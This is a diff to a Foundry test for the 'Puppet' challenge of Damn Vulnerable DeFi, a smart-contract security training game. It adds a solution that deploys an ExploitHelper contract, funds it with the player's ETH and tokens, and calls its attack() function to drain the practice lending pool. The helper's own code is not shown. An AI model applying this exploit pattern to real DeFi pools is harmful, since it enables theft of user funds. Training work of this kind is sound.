@@ -2,11 +2,13 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import "forge-std/Test.sol";
+import {ExploitHelper} from "./ExploitHelper.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,7 +94,15 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        ExploitHelper exploitHelper = new ExploitHelper(address(token), address(uniswapV1Exchange), address(lendingPool), recovery);
+
+        (bool success, bytes memory err) = payable(exploitHelper).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
+        assertTrue(success);
+        assertEq(err, "");
+        token.approve(address(exploitHelper), PLAYER_INITIAL_TOKEN_BALANCE);
+        token.transfer(address(exploitHelper), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        exploitHelper.attack();
     }
 
     // Utility function to calculate Uniswap prices
